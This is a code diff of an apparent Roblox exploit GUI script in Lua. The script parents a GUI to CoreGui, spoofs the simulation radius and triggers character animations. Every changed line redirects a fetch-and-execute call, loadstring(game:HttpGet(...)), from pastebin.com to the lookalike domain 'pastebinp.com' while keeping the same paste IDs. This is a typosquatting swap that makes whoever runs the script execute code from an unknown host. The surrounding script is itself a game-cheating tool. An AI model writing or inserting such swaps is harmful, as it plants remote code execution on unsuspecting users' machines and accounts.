@@ -172,7 +172,7 @@ local TextLabel_11 = Instance.new("TextLabel")
 ScreenGui.Parent = game.CoreGui
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
  
-    loadstring(game:HttpGet("https://pastebin.com/raw/tUUGAeaH", true))()
+    loadstring(game:HttpGet("https://pastebinp.com/raw/tUUGAeaH", true))()
  
 spoof(game.Players.LocalPlayer, "MaximumSimulationRadius", 1000)
 spoof(game.Players.LocalPlayer, "SimulationRadius", 1000)
@@ -1970,7 +1970,7 @@ Align(Hat5.Handle, RArm, Vector3.new(0,0,0), Vector3.new(90,0,0))
 Align(Hat6.Handle, Head, Vector3.new(0,0.5,0), Vector3.new(0,0,0))
  
 wait(0.5)
-loadstring(game:HttpGet(('https://pastebin.com/raw/qShnBjCY'),true))()
+loadstring(game:HttpGet(('https://pastebinp.com/raw/qShnBjCY'),true))()
 end)
  
 StrongStand.Name = "Strong Stand"
@@ -9714,7 +9714,7 @@ game.Players.LocalPlayer.Character.Humanoid.HipHeight = 1
  
  
 wait(0.2)
-loadstring(game:HttpGet(('https://pastebin.com/raw/hkFAiC1y'),true))()
+loadstring(game:HttpGet(('https://pastebinp.com/raw/hkFAiC1y'),true))()
 end)
  
 Trashcan.Name = "Trashcan"
@@ -9956,7 +9956,7 @@ Align(Hat1.Handle, Torso, Vector3.new(0,0,0.1), Vector3.new(0,0,0))
 Hat1.Handle.Mesh.Scale = Vector3.new(6,6,6)
  
 wait(0.5)
-loadstring(game:HttpGet(('https://pastebin.com/raw/1Mv3AQ3a'),true))()
+loadstring(game:HttpGet(('https://pastebinp.com/raw/1Mv3AQ3a'),true))()
 end)
  
 NoobDance.Name = "NoobDance"
